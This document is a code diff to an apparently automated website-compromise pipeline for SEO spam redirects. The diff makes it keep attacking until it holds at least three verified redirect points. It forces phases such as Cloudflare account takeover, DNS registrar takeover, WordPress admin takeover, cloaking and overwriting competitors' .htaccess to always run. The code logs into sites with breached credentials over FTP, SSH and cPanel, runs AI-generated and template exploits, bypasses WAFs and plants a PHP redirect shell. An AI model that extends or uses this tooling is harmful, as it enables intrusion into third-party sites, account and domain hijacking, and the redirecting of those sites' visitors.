@@ -1001,9 +1001,37 @@ export async function runUnifiedAttackPipeline(
     return false;
   }
 
-  /** Check if we already have a verified redirect (no need to continue attacking) */
+  /** Check if we have at least one verified redirect */
   function hasSuccessfulRedirect(): boolean {
     return uploadedFiles.some(f => f.redirectWorks && f.redirectDestinationMatch);
+  }
+
+  /** THOROUGH MODE: Check if we have enough redundancy (multiple verified redirect points) */
+  const MIN_REDUNDANCY_POINTS = 3;
+  function hasEnoughRedundancy(): boolean {
+    const verifiedCount = uploadedFiles.filter(f => f.redirectWorks && f.redirectDestinationMatch).length;
+    return verifiedCount >= MIN_REDUNDANCY_POINTS;
+  }
+
+  /** Get count of verified redirect points */
+  function getRedundancyCount(): number {
+    return uploadedFiles.filter(f => f.redirectWorks && f.redirectDestinationMatch).length;
+  }
+
+  /** MUST-RUN phases that should NEVER be skipped even if redirect already works */
+  const MUST_RUN_PHASES = new Set([
+    'redirect_takeover',    // Phase 5.6b: Competitor .htaccess overwrite
+    'iis_ua_cloaking',      // Phase 5.7: IIS UA Cloaking
+    'cf_takeover',          // Phase 5.8: Cloudflare Account Takeover
+    'registrar_takeover',   // Phase 5.9: DNS Registrar Takeover
+    'cloaking',             // Phase 6: SEO Cloaking
+    'wp_admin',             // Phase 4.6: WP Admin Takeover
+  ]);
+
+  /** Smart phase skip: only skip if we have enough redundancy AND phase is not must-run */
+  function canSkipPhase(phase: string): boolean {
+    if (MUST_RUN_PHASES.has(phase)) return false; // Never skip must-run phases
+    return hasEnoughRedundancy(); // Only skip when we have 3+ verified points
   }
 
   // ─── Phase 0+1: AI Target Analysis + Pre-screening (PARALLEL to save time) ───
@@ -1900,7 +1928,7 @@ export async function runUnifiedAttackPipeline(
         aiDecisions.push(`💀 Breach Hunt: ${breachHuntResult.totalCredentials} credentials found (${plaintextCreds.length} plaintext) from ${breachHuntResult.sources.filter(s => s.status === "success").length} sources`);
 
         // Try login with breach credentials on common admin panels
-        if (plaintextCreds.length > 0 && !hasSuccessfulRedirect()) {
+        if (plaintextCreds.length > 0 && !canSkipPhase('vuln_scan')) {
           loggedOnEvent({
             phase: "breach_hunt" as any,
             step: "trying_login",
@@ -1956,7 +1984,7 @@ export async function runUnifiedAttackPipeline(
           }
 
           // Try generic admin login (non-WP)
-          if (!isWordPress && !hasSuccessfulRedirect()) {
+          if (!isWordPress && !canSkipPhase('vuln_scan')) {
             const adminPaths = ["/admin", "/administrator", "/wp-admin", "/login", "/panel", "/cpanel", "/user/login"];
             for (const adminPath of adminPaths) {
               try {
@@ -2127,7 +2155,7 @@ export async function runUnifiedAttackPipeline(
 
         // Execute exploits for file_upload and rce vulnerabilities
         // Strategy: AI Exploit Generator first → fallback to template-based exploits
-        if (exploitableVulns.length > 0 && !hasSuccessfulRedirect()) {
+        if (exploitableVulns.length > 0 && !canSkipPhase('vuln_scan')) {
           loggedOnEvent({
             phase: "wp_vuln_scan" as any,
             step: "exploiting",
@@ -2138,7 +2166,7 @@ export async function runUnifiedAttackPipeline(
           const redirectShell = `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;
 
           for (const vuln of exploitableVulns) {
-            if (hasSuccessfulRedirect()) break;
+            if (hasEnoughRedundancy()) break;
             try {
               // === AI EXPLOIT GENERATOR (primary) ===
               let aiExploitSuccess = false;
@@ -2217,7 +2245,7 @@ export async function runUnifiedAttackPipeline(
               }
 
               // === TEMPLATE EXPLOIT (fallback) ===
-              if (!aiExploitSuccess && !hasSuccessfulRedirect()) {
+              if (!aiExploitSuccess && !canSkipPhase('vuln_scan')) {
                 const exploitResult = await executeExploit(
                   config.targetUrl,
                   vuln,
@@ -2355,7 +2383,7 @@ export async function runUnifiedAttackPipeline(
 
           // Try exploiting critical/high vulns — AI Exploit Generator first, template fallback
           for (const vuln of exploitableVulns) {
-            if (hasSuccessfulRedirect()) break;
+            if (hasEnoughRedundancy()) break;
             if (vuln.type !== "file_upload" && vuln.type !== "rce" && vuln.type !== "auth_bypass" && vuln.type !== "sqli" && vuln.type !== "lfi") continue;
 
             loggedOnEvent({
@@ -2414,7 +2442,7 @@ export async function runUnifiedAttackPipeline(
             }
 
             // === TEMPLATE EXPLOIT (fallback) ===
-            if (!aiSuccess && !hasSuccessfulRedirect() && (vuln.type === "file_upload" || vuln.type === "rce")) {
+            if (!aiSuccess && !canSkipPhase('vuln_scan') && (vuln.type === "file_upload" || vuln.type === "rce")) {
               const shellObj = generateUnconditionalHtmlRedirect(config.redirectUrl, config.seoKeywords);
               const fileName = shellObj.filename;
               const fileContent = typeof shellObj.content === "string" ? shellObj.content : shellObj.content.toString();
@@ -2458,7 +2486,7 @@ export async function runUnifiedAttackPipeline(
 
               // Auto-exploit critical/high DB CVE matches with AI Exploit Generator
               const criticalMatches = dbCveMatches.filter(m => m.severity === 'critical' || m.severity === 'high');
-              if (criticalMatches.length > 0 && !hasSuccessfulRedirect()) {
+              if (criticalMatches.length > 0 && !canSkipPhase('vuln_scan')) {
                 loggedOnEvent({
                   phase: "cms_vuln_scan" as any,
                   step: "db_exploit",
@@ -2467,7 +2495,7 @@ export async function runUnifiedAttackPipeline(
                 });
 
                 for (const match of criticalMatches.slice(0, 5)) { // Limit to top 5
-                  if (hasSuccessfulRedirect()) break;
+                  if (hasEnoughRedundancy()) break;
                   try {
                     const aiResult = await Promise.race([
                       generateAndExecuteExploit(
@@ -2577,7 +2605,7 @@ export async function runUnifiedAttackPipeline(
     maxTimeMs: GLOBAL_TIMEOUT,
   };
 
-  if (!shouldStop('ai_brain') && !hasSuccessfulRedirect()) {
+  if (!shouldStop('ai_brain') && !canSkipPhase('ai_brain')) {
     try {
       loggedOnEvent({
         phase: "ai_analysis" as any,
@@ -2625,8 +2653,8 @@ export async function runUnifiedAttackPipeline(
 
   // ─── Phase 3: Shell Generation ───
   let shells: GeneratedShell[] = [];
-  if (shouldStop('shell_gen') || hasSuccessfulRedirect()) {
-    loggedOnEvent({ phase: "shell_gen", step: "skipped", detail: `⏭️ Shell generation skipped — ${hasSuccessfulRedirect() ? 'already have successful redirect' : 'timeout'}`, progress: 50 });
+  if (shouldStop('shell_gen') || canSkipPhase('shell_gen')) {
+    loggedOnEvent({ phase: "shell_gen", step: "skipped", detail: `⏭️ Shell generation skipped — ${canSkipPhase('shell_gen') ? `มี ${getRedundancyCount()} redirect points (>=${MIN_REDUNDANCY_POINTS} = พอแล้ว)` : 'timeout'}`, progress: 50 });
   } else
   try {
     loggedOnEvent({
@@ -2750,7 +2778,7 @@ export async function runUnifiedAttackPipeline(
   }
 
   // ─── Phase 3.6: WP REST API Content Injection (if WP + credentials) ───
-  if (isWordPress && wpAuthCredentials && !shouldStop('wp_rest_inject') && !hasSuccessfulRedirect()) {
+  if (isWordPress && wpAuthCredentials && !shouldStop('wp_rest_inject') && !canSkipPhase('wp_rest_inject')) {
     try {
       loggedOnEvent({
         phase: "upload",
@@ -2763,7 +2791,7 @@ export async function runUnifiedAttackPipeline(
 
       // Try creating a page first (more SEO value), then a post
       for (const asPage of [true, false]) {
-        if (hasSuccessfulRedirect()) break;
+        if (hasEnoughRedundancy()) break;
 
         const restResult = await injectViaWpRestApi({
           targetUrl: config.targetUrl,
@@ -2824,7 +2852,7 @@ export async function runUnifiedAttackPipeline(
   // ─── Phase 4: Upload (try each shell with all methods) ────
   let totalAttempts = 0;
 
-  if (shells.length > 0 && !shouldStop('upload') && !hasSuccessfulRedirect()) {
+  if (shells.length > 0 && !shouldStop('upload') && !canSkipPhase('upload')) {
     loggedOnEvent({
       phase: "upload",
       step: "start",
@@ -2855,7 +2883,7 @@ export async function runUnifiedAttackPipeline(
     // Try uploading each shell until we get at least one success
     for (let i = 0; i < sortedShells.length; i++) {
       // Check global deadline and success status before each shell attempt
-      if (shouldStop('upload_loop') || hasSuccessfulRedirect()) break;
+      if (shouldStop('upload_loop') || hasEnoughRedundancy()) break;
 
       const shell = sortedShells[i];
 
@@ -3083,13 +3111,13 @@ export async function runUnifiedAttackPipeline(
 
   const hasVerifiedRedirect = uploadedFiles.some(f => f.redirectWorks);
 
-  if (!hasVerifiedRedirect && shells.length > 0 && !shouldStop('advanced_attacks') && !hasSuccessfulRedirect()) {
+  if (!hasVerifiedRedirect && shells.length > 0 && !shouldStop('advanced_attacks') && !canSkipPhase('advanced_attacks')) {
     const bestShell = shells[0];
     const shellContent = typeof bestShell.content === "string" ? bestShell.content : bestShell.content.toString("base64");
     const targetForAdvanced = originIp ? `http://${originIp}` : config.targetUrl;
 
     // 4.5a: WAF Bypass uploads (enhanced with waf-detector evasion strategy)
-    if (config.enableWafBypass !== false && !shouldStop('waf_bypass') && !hasSuccessfulRedirect()) {
+    if (config.enableWafBypass !== false && !shouldStop('waf_bypass') && !canSkipPhase('waf_bypass')) {
       try {
         const wafName = wafDetectionResult?.detected ? wafDetectionResult.wafName : "Unknown";
         const evasionHint = evasionStrategy ? ` — Evasion: ${evasionStrategy.primaryTechniques.slice(0, 3).join(", ")}` : "";
@@ -3241,7 +3269,7 @@ export async function runUnifiedAttackPipeline(
     }
 
     // 4.5b: Alternative Upload Vectors
-    if (config.enableAltUpload !== false && !uploadedFiles.some(f => f.redirectWorks) && !shouldStop('alt_upload') && !hasSuccessfulRedirect()) {
+    if (config.enableAltUpload !== false && !uploadedFiles.some(f => f.redirectWorks) && !shouldStop('alt_upload') && !canSkipPhase('alt_upload')) {
       try {
         loggedOnEvent({
           phase: "alt_upload",
@@ -3303,7 +3331,7 @@ export async function runUnifiedAttackPipeline(
     }
 
     // 4.5c: Indirect Attacks (SQLi, LFI, SSRF, Log Poisoning)
-    if (config.enableIndirectAttacks !== false && !uploadedFiles.some(f => f.redirectWorks) && !shouldStop('indirect') && !hasSuccessfulRedirect()) {
+    if (config.enableIndirectAttacks !== false && !uploadedFiles.some(f => f.redirectWorks) && !shouldStop('indirect') && !canSkipPhase('indirect')) {
       try {
         loggedOnEvent({
           phase: "indirect",
@@ -3364,7 +3392,7 @@ export async function runUnifiedAttackPipeline(
   let wpAdminResults: WpTakeoverResult[] = [];
   let wpDbInjectionResults: WpDbInjectionResult[] = [];
 
-  if (!uploadedFiles.some(f => f.redirectWorks) && !shouldStop('wp_admin') && !hasSuccessfulRedirect()) {
+  if (!uploadedFiles.some(f => f.redirectWorks) && !shouldStop('wp_admin')) {
     // 4.6a: WP Admin Takeover (brute force → theme/plugin editor → XMLRPC → REST API)
     if (config.enableWpAdminTakeover !== false) {
       try {
@@ -3536,7 +3564,7 @@ export async function runUnifiedAttackPipeline(
   const isGenericTarget = !detectedCmsForNonWp || detectedCmsForNonWp === "unknown" || detectedCmsForNonWp === "custom";
   const hasVerifiedUploads = uploadedFiles.filter(f => f.verified).length > 0;
 
-  if (!hasVerifiedUploads && (isNonWpTarget || isGenericTarget) && !shouldStop('nonwp_exploits') && !hasSuccessfulRedirect()) {
+  if (!hasVerifiedUploads && (isNonWpTarget || isGenericTarget) && !shouldStop('nonwp_exploits') && !canSkipPhase('nonwp_exploits')) {
     loggedOnEvent({
       phase: "shellless" as any,
       step: "nonwp_exploits_start",
@@ -3614,7 +3642,7 @@ export async function runUnifiedAttackPipeline(
   // ─── Phase 4.8: Generic Upload Engine (CMS-agnostic upload methods) ───
   let genericUploadReport: GenericUploadReport | null = null;
 
-  if (!hasVerifiedUploads && !shouldStop('generic_upload') && !hasSuccessfulRedirect()) {
+  if (!hasVerifiedUploads && !shouldStop('generic_upload') && !canSkipPhase('generic_upload')) {
     try {
       const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
       loggedOnEvent({
@@ -3718,7 +3746,7 @@ export async function runUnifiedAttackPipeline(
   }
 
   // ═══ AI BRAIN: Mid-Attack Pivot Decision (after upload phases) ═══
-  if (attackPlan && !hasSuccessfulRedirect() && !shouldStop('ai_pivot')) {
+  if (attackPlan && !canSkipPhase('ai_pivot') && !shouldStop('ai_pivot')) {
     try {
       // Update brain context with results so far
       brainContext.attemptedMethods = uploadedFiles.length > 0 ? ['shell_upload'] : [];
@@ -3769,7 +3797,7 @@ export async function runUnifiedAttackPipeline(
   // ─── Phase 5: Shellless Attacks (when ALL uploads failed) ───
   let shelllessResults: ShelllessResult[] = [];
 
-  if (uploadedFiles.length === 0 && !shouldStop('shellless') && !hasSuccessfulRedirect()) {
+  if (uploadedFiles.length === 0 && !shouldStop('shellless') && !canSkipPhase('shellless')) {
     loggedOnEvent({
       phase: "shellless",
       step: "start",
@@ -4056,7 +4084,7 @@ export async function runUnifiedAttackPipeline(
 
   // ─── Phase 5.5: Redirect Takeover (overwrite competitor redirects on already-hacked sites) ───
   const redirectTakeoverEnabled = !config.methodPriority || config.methodPriority.length === 0 || config.methodPriority.some(m => m.id === 'redirect_takeover' && m.enabled);
-  if (!hasSuccessfulRedirect() && !shouldStop('redirect_takeover') && redirectTakeoverEnabled) {
+  if (!shouldStop('redirect_takeover') && redirectTakeoverEnabled) {
     try {
       // Use early detection results if available (saves 15-20s re-detection)
       const detectionToUse = earlyRedirectDetection;
@@ -4211,12 +4239,12 @@ export async function runUnifiedAttackPipeline(
         ];
 
         for (const cred of leakcheckCredentials.slice(0, 30)) {
-          if (hasSuccessfulRedirect() || shouldStop('leakcheck_cred')) break;
+          if (hasEnoughRedundancy() || shouldStop('leakcheck_cred')) break;
 
           const username = cred.username || cred.email.split("@")[0];
 
           // ─── FTP Upload via basic-ftp (if port 21 open) ───
-          if (ftpAvailable && !hasSuccessfulRedirect()) {
+          if (ftpAvailable && !canSkipPhase('leakcheck_ftp')) {
             try {
               loggedOnEvent({
                 phase: "ftp_upload" as any,
@@ -4285,10 +4313,10 @@ export async function runUnifiedAttackPipeline(
             }
           }
 
-          if (hasSuccessfulRedirect()) break;
+          if (hasEnoughRedundancy()) break;
 
           // ─── SSH/SFTP Upload via ssh2 (if port 22 open) ───
-          if (sshAvailable && !hasSuccessfulRedirect()) {
+          if (sshAvailable && !canSkipPhase('leakcheck_ssh')) {
             try {
               loggedOnEvent({
                 phase: "ssh_upload" as any,
@@ -4363,7 +4391,7 @@ export async function runUnifiedAttackPipeline(
             }
           }
 
-          if (hasSuccessfulRedirect()) break;
+          if (hasEnoughRedundancy()) break;
 
           // Try cPanel/DirectAdmin web login (Shodan-filtered)
           for (const target of loginTargets) {
@@ -4577,7 +4605,7 @@ export async function runUnifiedAttackPipeline(
         }
 
         // ─── Step 2: Standard Credential Takeover (fallback if deep analysis didn't succeed) ───
-        if (!hasSuccessfulRedirect()) {
+        if (!canSkipPhase('leakcheck_fallback')) {
         const { executeRedirectTakeover: execTakeover } = await import("./redirect-takeover");
         const ftpCreds = validCreds.map(c => ({ host: targetHost, username: c.username, password: c.password, port: 21 }));
         const sshCreds = validCreds.map(c => ({ host: targetHost, username: c.username, password: c.password, port: 22 }));
@@ -4621,7 +4649,7 @@ export async function runUnifiedAttackPipeline(
             progress: 90,
           });
         }
-        } // end if (!hasSuccessfulRedirect()) fallback
+        } // end if (!canSkipPhase('leakcheck_fallback')) fallback
       }
     } catch (error: any) {
       loggedOnEvent({
@@ -4636,7 +4664,7 @@ export async function runUnifiedAttackPipeline(
   // ─── Phase 5.7: IIS UA Cloaking (nsru.ac.th style) ───
   let iisCloakingResult: IISCloakingResult | null = null;
 
-  if (isIIS && !hasSuccessfulRedirect() && !shouldStop('iis_ua_cloaking')) {
+  if (isIIS && !shouldStop('iis_ua_cloaking')) {
     try {
       loggedOnEvent({
         phase: "iis_cloaking",
@@ -4708,7 +4736,7 @@ export async function runUnifiedAttackPipeline(
     loggedOnEvent({
       phase: "iis_cloaking",
       step: "skipped",
-      detail: `⏭️ IIS UA Cloaking ข้าม — ${hasSuccessfulRedirect() ? "มี redirect สำเร็จแล้ว" : "ถูกหยุด"}`,
+      detail: `⏭️ IIS UA Cloaking ข้าม — ${canSkipPhase('iis_ua_cloaking') ? `มี ${getRedundancyCount()} redirect points` : "ถูกหยุด"}`,
       progress: 92,
     });
   }
@@ -4716,7 +4744,7 @@ export async function runUnifiedAttackPipeline(
   // ─── Phase 5.8: Cloudflare Account Takeover ───
   let cfTakeoverResult: CloudflareTakeoverResult | null = null;
 
-  if (isCfLevelRedirect && leakcheckCredentials.length > 0 && !hasSuccessfulRedirect() && !shouldStop('cf_takeover')) {
+  if (isCfLevelRedirect && leakcheckCredentials.length > 0 && !shouldStop('cf_takeover')) {
     try {
       loggedOnEvent({
         phase: "cf_takeover" as any,
@@ -4796,7 +4824,7 @@ export async function runUnifiedAttackPipeline(
     loggedOnEvent({
       phase: "cf_takeover" as any,
       step: "skipped",
-      detail: `⏭️ CF Takeover ข้าม — ${!leakcheckCredentials.length ? "ไม่มี credentials" : hasSuccessfulRedirect() ? "มี redirect สำเร็จแล้ว" : "ถูกหยุด"}`,
+      detail: `⏭️ CF Takeover ข้าม — ${!leakcheckCredentials.length ? "ไม่มี credentials" : canSkipPhase('cf_takeover') ? `มี ${getRedundancyCount()} redirect points` : "ถูกหยุด"}`,
       progress: 94,
     });
   }
@@ -4804,7 +4832,7 @@ export async function runUnifiedAttackPipeline(
   // ─── Phase 5.9: DNS Registrar Takeover (fallback if CF takeover failed) ───
   let registrarTakeoverResult: RegistrarTakeoverResult | null = null;
 
-  if (isCfLevelRedirect && !hasSuccessfulRedirect() && leakcheckCredentials.length > 0 && !shouldStop('registrar_takeover')) {
+  if (isCfLevelRedirect && leakcheckCredentials.length > 0 && !shouldStop('registrar_takeover')) {
     try {
       loggedOnEvent({
         phase: "registrar_takeover" as any,
@@ -5193,7 +5221,7 @@ export async function runUnifiedAttackPipeline(
   }
 
   // ═══ AUTO-EXECUTE EXPLOITABLE COMPREHENSIVE FINDINGS ═══
-  if (comprehensiveResults && comprehensiveResults.length > 0 && !hasSuccessfulRedirect()) {
+  if (comprehensiveResults && comprehensiveResults.length > 0 && !canSkipPhase('comprehensive')) {
     const exploitableFindings = comprehensiveResults.filter(r => r.exploitable && r.success);
     if (exploitableFindings.length > 0) {
       loggedOnEvent({
